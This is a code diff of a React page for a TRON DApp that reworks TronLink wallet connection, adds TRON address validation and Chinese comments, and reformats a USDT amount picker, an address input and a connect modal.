@@ -3,12 +3,19 @@
 import { useState } from "react";
 
 import {
-  useWallet
+  useWallet,
 } from "@tronweb3/tronwallet-adapter-react-hooks";
 
 
-
 export default function Home() {
+
+
+  const {
+    connect,
+    connected,
+    address,
+  } = useWallet();
+
 
 
   const [amount,setAmount] = useState("2000");
@@ -21,14 +28,6 @@ export default function Home() {
 
 
 
-  const {
-    connect,
-    connected,
-    address,
-  } = useWallet();
-
-
-
 
 
   async function bindWallet(){
@@ -36,6 +35,8 @@ export default function Home() {
 
     try{
 
+
+      // 检查输入地址
 
       if(!inputAddress.trim()){
 
@@ -52,6 +53,8 @@ export default function Home() {
 
 
 
+      // TRON地址格式检查
+
       const tronReg =
       /^T[1-9A-HJ-NP-Za-km-z]{33}$/;
 
@@ -67,13 +70,13 @@ export default function Home() {
 
         return;
 
-
       }
 
 
 
 
 
+      // 检查钱包是否连接
 
       if(!connected){
 
@@ -81,10 +84,7 @@ export default function Home() {
         setShowWalletModal(true);
 
 
-        await connect();
-
-
-        setShowWalletModal(false);
+        return;
 
 
       }
@@ -93,35 +93,24 @@ export default function Home() {
 
 
 
-
-      if(address){
-
-
-        setMsg(
-          "钱包连接成功：" + address
-        );
+      // 已连接获取地址
 
 
-      }else{
-
-
-        setMsg(
-          "钱包连接成功，请等待地址读取"
-        );
-
-
-      }
+      setMsg(
+        "钱包地址：" + address
+      );
 
 
 
-    }catch(error){
+    }
+    catch(error){
 
 
       console.log(error);
 
 
       setMsg(
-        "钱包连接失败"
+        "钱包检测失败"
       );
 
 
@@ -136,27 +125,51 @@ export default function Home() {
 
 
 
-  function openWallet(){
+  async function connectWallet(){
 
 
-  const currentUrl = window.location.href;
+    try{
 
 
-  window.location.href =
-  `tronlink://openUrl?url=${encodeURIComponent(currentUrl)}`;
-
-
-}
+      await connect();
 
 
 
+      setShowWalletModal(false);
 
 
 
+      setMsg(
+        "TronLink 钱包连接成功"
+      );
 
+
+
+    }
+    catch(error){
+
+
+      console.log(error);
+
+
+
+      setMsg(
+        "钱包连接失败"
+      );
+
+
+    }
+
+
+  }
   return (
 
+
     <main className="min-h-screen bg-[#030817] text-white px-5 py-6">
+
+
+
+      {/* Header */}
 
 
       <div className="flex justify-between items-center">
@@ -170,6 +183,7 @@ export default function Home() {
             KK
 
           </div>
+
 
 
           <div>
@@ -197,6 +211,7 @@ export default function Home() {
 
 
 
+
         <div className="rounded-full border border-white/10 px-4 py-2 text-sm">
 
           🟢 TRON Network
@@ -204,10 +219,16 @@ export default function Home() {
         </div>
 
 
+
       </div>
 
 
 
+
+
+
+
+      {/* 标题 */}
 
 
       <div className="text-center mt-20">
@@ -240,9 +261,19 @@ export default function Home() {
         </p>
 
 
+
       </div>
 
 
+
+
+
+
+
+
+
+
+      {/* 金额选择 */}
 
 
 
@@ -264,14 +295,20 @@ export default function Home() {
         className={`block rounded-3xl border p-6 mb-4 cursor-pointer ${
         
         amount==="2000"
+        
         ?
+        
         "border-cyan-400 bg-cyan-400/10"
+        
         :
+        
         "border-white/10 bg-white/5"
-
+        
         }`}
 
+
         >
+
 
 
           <input
@@ -309,13 +346,25 @@ export default function Home() {
           </div>
 
 
+
+          <div className="text-gray-400 mt-3 text-sm">
+
+            新用户体验额度
+
+          </div>
+
+
         </label>
 
 
 
 
 
+
+
+
         <div className="grid grid-cols-2 gap-4">
+
 
 
           {
@@ -329,19 +378,24 @@ export default function Home() {
           className={`rounded-2xl border py-5 text-center cursor-pointer ${
           
           amount===item
+          
           ?
+          
           "border-cyan-400 bg-cyan-400/20 text-cyan-300"
+          
           :
+          
           "border-white/10 bg-white/5"
-
+          
           }
           
           ${item==="30000"?"col-span-2":""}
-
+          
           `}
 
 
           >
+
 
 
           <input
@@ -357,20 +411,29 @@ export default function Home() {
           />
 
 
+
           {item} USDT
+
 
 
           </label>
 
 
-          ))
 
+          ))
           }
 
 
 
         </div>
-                <div className="text-center mt-5 text-sm text-gray-400">
+
+
+
+
+
+
+        <div className="text-center mt-5 text-sm text-gray-400">
+
 
           当前选择：
 
@@ -379,6 +442,7 @@ export default function Home() {
             {amount} USDT
 
           </span>
+
 
         </div>
 
@@ -392,9 +456,12 @@ export default function Home() {
 
 
 
+
       {/* 地址 */}
 
+
       <div className="mt-12">
+
 
 
         <h2 className="font-bold text-lg mb-5">
@@ -419,22 +486,24 @@ export default function Home() {
 
 
 
+
           <input
 
 
-            value={inputAddress}
+          value={inputAddress}
 
 
-            onChange={(e)=>setInputAddress(e.target.value)}
+          onChange={(e)=>setInputAddress(e.target.value)}
 
 
-            placeholder="请输入您的TRON钱包地址"
+          placeholder="请输入您的TRON钱包地址"
 
 
-            className="flex-1 bg-transparent outline-none placeholder:text-gray-600"
+          className="flex-1 bg-transparent outline-none placeholder:text-gray-600"
 
 
           />
+
 
 
         </div>
@@ -444,18 +513,17 @@ export default function Home() {
 
 
 
-
-
         <button
 
 
-          onClick={bindWallet}
+        onClick={bindWallet}
 
 
-          className="mt-6 w-full rounded-2xl py-5 font-bold text-black bg-gradient-to-r from-cyan-300 to-blue-400"
+        className="mt-6 w-full rounded-2xl py-5 font-bold text-black bg-gradient-to-r from-cyan-300 to-blue-400"
 
 
         >
+
 
           立即绑定
 
@@ -469,15 +537,16 @@ export default function Home() {
 
 
         {
-          msg &&
+        msg &&
 
-          <div className="text-center text-cyan-300 mt-4 text-sm">
+        <div className="text-center text-cyan-300 mt-4 text-sm">
 
-            {msg}
+          {msg}
 
-          </div>
+        </div>
 
         }
+
 
 
 
@@ -485,45 +554,36 @@ export default function Home() {
 
 
         {
-          address &&
+        connected && address && (
 
 
-          <div className="mt-5 rounded-2xl bg-white/5 border border-white/10 p-4 text-sm break-all">
+        <div className="mt-5 rounded-2xl bg-white/5 border border-white/10 p-4">
 
 
-            <div className="text-green-400">
+          <div className="text-green-400">
 
-              🟢 钱包已连接
-
-            </div>
-
-
-            <div className="text-gray-400 mt-2">
-
-              {address}
-
-            </div>
-
+            🟢 TronLink 已连接
 
           </div>
 
 
+          <div className="text-gray-400 mt-2 break-all">
+
+            {address}
+
+          </div>
+
+
+        </div>
+
+
+        )
         }
 
 
 
-
-
       </div>
-
-
-
-
-
-
-
-
-      {/* 安全区域 */}
+            {/* 安全区域 */}
 
 
       <div className="mt-12 space-y-4">
@@ -562,6 +622,10 @@ export default function Home() {
 
 
 
+      {/* Footer */}
+
+
+
       <footer className="text-center mt-16 pb-10 text-gray-500">
 
 
@@ -584,7 +648,11 @@ export default function Home() {
 
 
 
-      {/* 钱包连接弹窗 */}
+
+
+
+
+      {/* TronLink连接弹窗 */}
 
 
 
@@ -596,7 +664,11 @@ export default function Home() {
       <div className="fixed inset-0 bg-black/70 flex items-center justify-center px-6 z-50">
 
 
+
         <div className="bg-[#101936] rounded-3xl p-8 text-center w-full max-w-sm border border-white/10">
+
+
+
 
 
           <img
@@ -610,16 +682,25 @@ export default function Home() {
 
 
 
+
+
+
           <h2 className="text-2xl font-bold mt-6">
 
+
             连接TRON钱包
+
 
           </h2>
 
 
 
 
+
+
+
           <p className="text-gray-400 mt-4 leading-7">
+
 
             请连接您的TronLink钱包
 
@@ -627,7 +708,10 @@ export default function Home() {
 
             安全访问DApp
 
+
           </p>
+
+
 
 
 
@@ -636,7 +720,7 @@ export default function Home() {
           <button
 
 
-          onClick={openWallet}
+          onClick={connectWallet}
 
 
           className="mt-8 w-full rounded-2xl py-5 bg-gradient-to-r from-cyan-300 to-blue-400 text-black font-bold"
@@ -644,10 +728,14 @@ export default function Home() {
 
           >
 
+
             连接 TronLink 钱包
 
 
           </button>
+
+
+
 
 
 
@@ -664,13 +752,20 @@ export default function Home() {
 
           >
 
+
             取消
+
 
           </button>
 
 
 
+
+
+
+
         </div>
+
 
 
       </div>
@@ -681,7 +776,10 @@ export default function Home() {
 
 
 
+
+
     </main>
+
 
   );
 
